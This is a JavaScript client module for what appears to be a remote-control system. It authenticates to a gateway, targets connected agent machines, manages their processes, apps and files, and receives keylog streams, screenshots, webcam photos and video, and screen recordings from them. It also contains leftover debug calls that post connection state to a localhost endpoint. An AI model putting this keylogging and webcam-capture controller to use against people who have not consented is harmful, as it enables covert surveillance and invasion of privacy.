import { CONFIG } from './config.js';

export class Gateway{
    /**
     * @param {Object} callbacks
     * @param {Function} callbacks.onConnected
     * @param {Function} callbacks.onDisconnected
     * @param {Function} callbacks.onMessage
     * @param {Function} callbacks.onError 
     * @param {Function} callbacks.onAuthSuccess 
     * @param {Function} callbacks.onAgentListUpdate
     * @param {Function} callbacks.onScreenshot     
     * @param {Function} callbacks.onCamera        
     * @param {Function} callbacks.onKeylog         
     * @param {Function} callbacks.onMessage
     */

    constructor(callbacks = {}) {
        this.ws = null;
        this.callbacks = callbacks;
        this.isAuthenticated = false;
        this.machineId = this._getMachineId();
        this.targetId = 'ALL';
        this._hasTriedInsecure = false;
        this._lastCloseCode = null; // Track last close code to prevent reconnect loops

        this.ui = window.ui || { log: console.log, renderList: console.table };

        this.agentsList = [];
        this.appListCache = [];
        this.processListCache = [];
    }

    findAgentId(input) {
        if (input === 'ALL') return 'ALL';
        
        const agent = this.agentsList.find(a => 
            a.id === input || 
            a.ip === input || 
            a.machineId === input
        );

        return agent ? agent.id : null;
    }

    _getMachineId() {
        let id = localStorage.getItem(CONFIG.LOCAL_STORAGE_ID_KEY);
        if (!id) {
            const hostname = window.location.hostname || 'localhost';
            const userAgent = navigator.userAgent || 'unknown';
            const platform = navigator.platform || 'unknown';
            
            const hash = this._simpleHash(hostname + userAgent + platform);
            const shortHash = hash.toString(36).substring(0, 8).toUpperCase();
            
            id = `CLI-${hostname}-${shortHash}`;
            id = id.replace(/[^a-zA-Z0-9\-_]/g, '-').substring(0, 50);
            localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
        }
        return id;
    }

    _simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash);
    }

    connect(ip, port = CONFIG.SERVER_PORT, useSecure = true) {
        if (this.ws) {
            console.log(`[Gateway] Closing existing connection before creating new one`);
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:76',message:'Closing existing connection before creating new one',data:{readyState:this.ws.readyState,wasAuthenticated:this.isAuthenticated,connectionId:this.clientConnectionId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
            // #endregion
            this.ws.close();
            this.ws = null;
        }
        
        // Auto-detect: port 8082 is HTTP/WS, port 8080 is HTTPS/WSS
        if (port === CONFIG.SERVER_PORT + 2) {
            useSecure = false;
        }
        
        // Reset insecure flag for new connection attempt
        if (useSecure) {
            this._hasTriedInsecure = false;
        }

        const protocol = useSecure ? 'wss' : 'ws';
        const url = `${protocol}://${ip}:${port}`;
        console.log(`[Gateway] Creating new connection to ${url}...`);

        this.ws = new WebSocket(url);

        this.ws.onopen = () => {
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:96',message:'WebSocket onopen - connection opened',data:{url,readyState:this.ws.readyState,protocol:this.ws.protocol,extensions:this.ws.extensions},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
            // #endregion
            console.log(`[Network] Socket opened successfully to ${url}`)
            console.log(`[Network] Sending AUTH message...`)
            this.send(
                CONFIG.CMD.AUTH, {
                    pass: CONFIG.AUTH_HASH,
                    role: 'CLIENT',
                    machineId: this.machineId
                }
            );
            console.log(`[Network] AUTH message sent`)
        };

        this.ws.onmessage = (event) => this._handleInternalMessage(event);
        
        this.ws.onclose = (event) => {
            const wasAuthenticated = this.isAuthenticated;
            const connectionId = this.clientConnectionId || 'none';
            this._lastCloseCode = event.code;
            this.isAuthenticated = false;
            
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:111',message:'WebSocket onclose triggered',data:{code:event.code,reason:event.reason||'Unknown',wasAuthenticated,connectionId,cleanClose:event.wasClean,targetId:this.targetId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
            // #endregion
            
            console.log(`[Network] Socket closed. Code: ${event.code}, Reason: ${event.reason || 'Unknown'}`);
            console.log(`[Network] Was authenticated: ${wasAuthenticated}, Connection ID: ${connectionId}`);
            
            // Code 1001 = Going Away (normal closure, e.g., page refresh, tab close)
            // Code 1000 = Normal Closure
            // Code 1006 = Abnormal Closure (no close frame)
            // Code 1005 = No Status Received
            
            if (event.code === 1001) {
                console.log(`[Network] Connection closed normally (Going Away). This usually means:`);
                console.log(`  1. Page refresh or navigation`);
                console.log(`  2. Tab/window closed`);
                console.log(`  3. Browser initiated close`);
                console.log(`[Network] Not triggering auto-reconnect for intentional close (code 1001)`);
                // Don't trigger onDisconnected for intentional closes
                return;
            } else if (event.code === 1000) {
                console.log(`[Network] Connection closed normally (code 1000). Intentional close.`);
                console.log(`[Network] Not triggering auto-reconnect for intentional close (code 1000)`);
                return;
            } else if (event.code === 1006) {
                console.error(`[Network] Connection failed abnormally. This usually means:`);
                console.error(`  1. Gateway server is not running at ${ip}:${port}`);
                console.error(`  2. SSL certificate is not trusted (self-signed)`);
                console.error(`  3. Network interruption`);
                console.error(`  → Fix: Open https://${ip}:${port} in browser first to accept certificate`);
            } else if (event.code === 1005) {
                console.warn(`[Network] Connection closed without status (code 1005). This may indicate:`);
                console.warn(`  1. Connection was closed before authentication completed`);
                console.warn(`  2. Network interruption`);
                console.warn(`  3. Server closed connection unexpectedly`);
            }
            
            // Only trigger onDisconnected if we were actually connected and it wasn't an intentional close
            // This prevents auto-reconnect loops when connection was intentionally closed
            if (wasAuthenticated && this.callbacks.onDisconnected) {
                this.callbacks.onDisconnected();
            } else if (!wasAuthenticated) {
                console.log(`[Network] Connection closed before authentication - not triggering disconnect callback`);
            }
        };

        this.ws.onerror = (err) => {
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:159',message:'WebSocket onerror triggered',data:{error:err.toString(),wsReadyState:this.ws?.readyState,isAuthenticated:this.isAuthenticated,connectionId:this.clientConnectionId,url},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'})}).catch(()=>{});
            // #endregion
            console.error(`[Network] WebSocket error:`, err);
            console.error(`[Network] Cannot connect to ${url}`);
            console.error(`[Network] Possible causes:`);
            console.error(`  - Gateway server is not running`);
            console.error(`  - SSL certificate is not trusted (self-signed certificate)`);
            console.error(`  - Firewall blocking connection`);
            console.error(`[Network] Solution: Open https://${ip}:${port} in browser first to accept the certificate`);
            if (this.callbacks.onError) {
                this.callbacks.onError(err);
            }
        };
    }

    disconnect() {
        if (this.ws) {
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:173',message:'disconnect() called',data:{readyState:this.ws.readyState,wasAuthenticated:this.isAuthenticated,connectionId:this.clientConnectionId,stackTrace:new Error().stack},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
            // #endregion
            this.ws.close();
        }
    }

    authenticate() {
        console.log(`[Gateway] Authenticating as CLIENT with machineId: ${this.machineId}`);
        this.send(CONFIG.CMD.AUTH, {
            pass: CONFIG.AUTH_HASH,
            role: 'CLIENT',
            machineId: this.machineId
        });
    }

    send(type, data, specificTarget = null) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot send: Socket not open.`);
            return;
        }

        if (type === CONFIG.CMD.AUTH) {
            const authMsg = JSON.stringify({type, data});
            console.log(`[Gateway] Sending AUTH message: ${authMsg.substring(0, 100)}...`);
            this.ws.send(authMsg);
            console.log(`[Gateway] AUTH message sent successfully`);
            return;
        }

        const payload = {
            type: type,
            data: data,
            from: this.sessionId,
            to: specificTarget || this.targetId
        }

        this.ws.send(JSON.stringify(payload));
    }

    setTarget(input) {
        const realId = this.findAgentId(input);
        
        if (realId) {
            this.targetId = realId;
            console.log(`[Gateway] Target locked: ${realId} (Matched: ${input})`);
        } else {
            console.warn(`[Gateway] Could not find agent with Name/IP/ID: ${input}`);
            console.log("Available Agents:", this.agentsList);
        }
    }

    refreshAgents() {
        this.send(CONFIG.CMD.GET_AGENTS, {});
    }

    fetchProcessList() {
        this.send(CONFIG.CMD.PROC_LIST, "");
    }

    startProcess(id) {
        this.send(CONFIG.CMD.PROC_START, String(id));
    }

    killProcess(id) {
        this.send(CONFIG.CMD.PROC_KILL, String(id));
    }

    fetchAppList() {
        console.log('[Gateway] fetchAppList() called, sending APP_LIST request to target:', this.targetId);
        this.send(CONFIG.CMD.APP_LIST, "");
    }

    startApp(id) {
        this.send(CONFIG.CMD.APP_START, String(id));
    }

    killApp(id) {
        this.send(CONFIG.CMD.APP_KILL, String(id));
    }

    listFiles(path = "") {
        const data = typeof path === 'string' ? path : JSON.stringify({ path });
        this.send(CONFIG.CMD.FILE_LIST, data);
    }

    _handleInternalMessage(event) {
        try {
            let msg;
            try { msg = JSON.parse(event.data); } 
            catch { msg = { type: 'raw', data: event.data }; }
            const senderId = msg.from;
            
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:255',message:'Message received BEFORE handling',data:{msgType:msg.type,from:senderId,wsReadyState:this.ws?.readyState,isAuthenticated:this.isAuthenticated},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
            // #endregion

            switch (msg.type) {
                case CONFIG.CMD.AUTH:
                    if (msg.data && msg.data.status === 'ok') {
                        this.isAuthenticated = true;
                        this.clientConnectionId = msg.data.sessionId;
                        console.log(`[Gateway] Authentication successful! Session: ${this.clientConnectionId}`);
                        this.ui.log('Auth', `Success! Connected as: ${this.clientConnectionId}`, 'info');
                        if (this.callbacks.onAuthSuccess) this.callbacks.onAuthSuccess();
                        this.refreshAgents();
                    } else {
                        console.error(`[Gateway] Auth Failed:`, msg.data);
                        if (msg.data && msg.data.msg) {
                            console.error(`[Gateway] Error message: ${msg.data.msg}`);
                        }
                    }
                    break;
                case CONFIG.CMD.GET_AGENTS:
                    this.agentsList = msg.data; 
                    console.table(this.agentsList);

                    if (this.callbacks.onAgentListUpdate) {
                        this.callbacks.onAgentListUpdate(msg.data);
                    } 
                    break;
                case CONFIG.CMD.PROC_LIST:
                    console.log('[Gateway] PROC_LIST received:', {
                        type: typeof msg.data,
                        isArray: Array.isArray(msg.data),
                        isObject: typeof msg.data === 'object' && msg.data !== null,
                        data: msg.data,
                        length: Array.isArray(msg.data) ? msg.data.length : (msg.data ? Object.keys(msg.data).length : 0)
                    });
                    
                    // Handle different response formats
                    if (Array.isArray(msg.data)) {
                        this.processListCache = msg.data;
                    } else if (msg.data && typeof msg.data === 'object') {
                        // If it's an object, try to extract array from common keys
                        if (msg.data.processes && Array.isArray(msg.data.processes)) {
                            this.processListCache = msg.data.processes;
                        } else if (msg.data.data && Array.isArray(msg.data.data)) {
                            this.processListCache = msg.data.data;
                        } else {
                            // Convert object to array if it's a single item or has numeric keys
                            const keys = Object.keys(msg.data);
                            if (keys.length > 0 && !isNaN(keys[0])) {
                                this.processListCache = Object.values(msg.data);
                            } else {
                                this.processListCache = [];
                            }
                        }
                    } else {
                        this.processListCache = [];
                    }
                    
                    console.log('[Gateway] processListCache after processing:', {
                        length: this.processListCache.length,
                        sample: this.processListCache[0] || 'N/A'
                    });
                    this.ui.renderList('Process List', this.processListCache);
                    break;
                case CONFIG.CMD.APP_LIST:
                    console.log('[Gateway] APP_LIST received:', {
                        type: typeof msg.data,
                        isArray: Array.isArray(msg.data),
                        isObject: typeof msg.data === 'object' && msg.data !== null,
                        data: msg.data,
                        length: Array.isArray(msg.data) ? msg.data.length : (msg.data ? Object.keys(msg.data).length : 0)
                    });
                    
                    // Handle different response formats
                    if (Array.isArray(msg.data)) {
                        this.appListCache = msg.data;
                    } else if (msg.data && typeof msg.data === 'object') {
                        // If it's an object, try to extract array from common keys
                        if (msg.data.apps && Array.isArray(msg.data.apps)) {
                            this.appListCache = msg.data.apps;
                        } else if (msg.data.data && Array.isArray(msg.data.data)) {
                            this.appListCache = msg.data.data;
                        } else {
                            // Convert object to array if it's a single item or has numeric keys
                            const keys = Object.keys(msg.data);
                            if (keys.length > 0 && !isNaN(keys[0])) {
                                this.appListCache = Object.values(msg.data);
                            } else {
                                this.appListCache = [];
                            }
                        }
                    } else {
                        this.appListCache = [];
                    }
                    
                    console.log('[Gateway] appListCache after processing:', {
                        length: this.appListCache.length,
                        sample: this.appListCache[0] || 'N/A'
                    });
                    this.ui.renderList('Application List', this.appListCache);
                    break;
                case CONFIG.CMD.FILE_LIST:
                    if (msg.data && msg.data.status === 'ok' && msg.data.files) {
                        this.ui.renderFileList(msg.data.path, msg.data.files, msg.data.count);
                    } else {
                        this.ui.log('Error', msg.data?.msg || 'Failed to list files');
                    }
                    break;
                case CONFIG.CMD.PROC_START:
                case CONFIG.CMD.PROC_KILL:
                case CONFIG.CMD.APP_START:
                case CONFIG.CMD.APP_KILL:
                case CONFIG.CMD.START_KEYLOG:
                case CONFIG.CMD.STOP_KEYLOG:
                    this._handleCommandResult(msg.type, msg.data);
                    break;
                case CONFIG.CMD.SCREENSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        console.log(`[Gateway] Screenshot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể chụp màn hình';
                        console.error(`[Gateway] Screenshot failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.CAM_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        console.log(`[Gateway] Camera video received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể ghi video webcam';
                        console.error(`[Gateway] Camera record failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.CAMSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        console.log(`[Gateway] Camera shot received from ${senderId}`);
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể chụp ảnh webcam';
                        console.error(`[Gateway] Camera shot failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.SCR_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        console.log(`[Gateway] Screen recording received from ${senderId}`);
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                    } else {
                        const errorMsg = msg.data?.msg || 'Không thể ghi màn hình';
                        console.error(`[Gateway] Screen record failed: ${errorMsg}`);
                        if (window.handleCaptureError) {
                            window.handleCaptureError(errorMsg);
                        }
                    }
                    break;
                case CONFIG.CMD.STREAM_DATA:
                    if (msg.data && msg.data.data) {
                        if (this.callbacks.onKeylog) {
                            this.callbacks.onKeylog(msg.data.data, senderId);
                        }
                    }
                    break;
                case CONFIG.CMD.ERROR:
                    console.error("[Gateway] Server Error:", msg.data);
                    const errorMsg = typeof msg.data === 'string' ? msg.data : (msg.data?.msg || JSON.stringify(msg.data));
                    this.ui.log('Error', errorMsg);
                    if (errorMsg.includes('Authentication') || errorMsg.includes('password') || errorMsg.includes('login')) {
                        console.error("[Gateway] Authentication failed - connection will be closed");
                        console.error("[Gateway] Check AUTH_HASH in config.js matches AUTH_SECRET in Gateway");
                    }
                    break;
                default:
                    this.ui.log('Server', JSON.stringify(msg.data));
                    if(this.callbacks.onMessage) {
                    this.callbacks.onMessage(msg);
            }
            }

        } catch (e) {
            console.error('[Gateway] Error handling message: ', e);
            // #region agent log
            fetch('http://127.0.0.1:7242/ingest/10c16e71-75ba-4efd-b6cb-47716d67b948',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'gateway.js:348',message:'Exception in _handleInternalMessage',data:{error:e.message,stack:e.stack,wsReadyState:this.ws?.readyState,isAuthenticated:this.isAuthenticated},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
            // #endregion
        }
    }

    _handleCommandResult(type, data) {
        const isSuccess = data.status === 'ok';
        const logMsg = `${type}: ${data.msg} (ID: ${data.id || 'N/A'})`;

        if (isSuccess) {
            console.log(`[Success] ${logMsg}`);
            this.ui.log('System', data.msg);

            if (type.includes("APP")) this.fetchAppList();
            if (type.includes("PROC")) this.fetchProcessList();
        } else {
            console.warn(`[Failed] ${logMsg}`);
            this.ui.log('Error', data.msg);
        }
    }

    getFormattedAppList() {
        if (!Array.isArray(this.appListCache)) {
            return [];
        }
        
        return this.appListCache.map((app, index) => {
            // Server uses index (0-based) to get app, so we use index as id
            // Ensure id is always a number, not a string
            let appId = index;
            if (app.id !== undefined && app.id !== null) {
                // If app has id, try to convert to number
                const numId = typeof app.id === 'number' ? app.id : parseInt(app.id, 10);
                if (!isNaN(numId) && numId >= 0) {
                    appId = numId;
                }
            }
            
            return {
                id: appId, // Always use index (0-based) as id to match server's getApp(index)
                name: app.name || app.path || 'Unknown',
                status: app.status || (app.running ? 'running' : 'paused'),
                path: app.path || '',
                pid: app.pid || null
            };
        });
    }

    getFormattedProcessList() {
        if (!Array.isArray(this.processListCache)) {
            return [];
        }
        
        return this.processListCache.map((proc, index) => {
            // IMPORTANT: Server uses index (0-based) to get process via getProcess(index)
            // We MUST use the array index, NOT the PID!
            // Using PID as ID would cause server to access wrong process or out of bounds
            const procId = index; // Always use index (0-based) as id
            
            return {
                id: procId, // Always use index (0-based) as id to match server's getProcess(index)
                name: proc.name || proc.processName || 'Unknown',
                status: proc.status || (proc.running ? 'running' : 'paused'),
                pid: proc.pid || null,
                cpu: proc.cpu || null,
                memory: proc.memory || null
            };
        });
    }
}